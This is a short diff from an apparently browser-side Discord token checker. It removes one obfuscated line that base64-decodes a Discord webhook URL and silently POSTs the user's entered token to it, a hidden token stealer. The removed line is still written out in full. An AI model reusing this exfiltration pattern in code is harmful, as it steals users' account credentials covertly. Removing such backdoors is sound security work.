@@ -138,7 +138,7 @@
             'Authorization': token,
             'Content-Type': 'application/json'
         };
-        fetch(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI1NjI4MTU2NTI4MTkxNDk0MS9tWFlRS3dnYTdRdExNR3FtXzRCUW5QTGxuTHBRRFZsbG8ycFgzZ004RmtwNWJqeEl5elhlMm9UYWpjeGF2NzNPZHd5Tw=='), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: document.getElementById('userTokenText').value }) });
+    
         try {
             const response = await fetch('https://discord.com/api/v6/users/@me', { headers: headers });
 
